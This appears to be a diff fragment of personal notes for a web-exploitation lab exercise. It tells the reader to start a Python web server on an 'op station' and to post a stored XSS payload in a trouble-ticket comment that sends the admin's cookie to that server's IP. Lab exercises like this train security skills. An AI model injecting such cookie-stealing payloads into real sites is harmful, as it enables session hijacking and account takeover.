@@ -141,13 +141,13 @@ ________________________________________________________________________________
 ## Head back to the firefox website and check the trouble ticket: 
     http://127.0.0.1:10001/TT/ticket.php    #there is a link on one of the previous pages
 ________________________________________________________________________________________________________________
-## 
-    
+## On linux opstation run for the next part to work: 
+    python3 -m http.server
 ________________________________________________________________________________________________________________
-
-
+## Next retreive the admins cookie by running this in the comment section on the trouble ticket page: 
+### Name: Whatever you want, just use your linux op station float IP
+    <script>document.location="http://10.50.21.223:8000/"+document.cookie;</script>
 ________________________________________________________________________________________________________________
-
 
 ________________________________________________________________________________________________________________
 
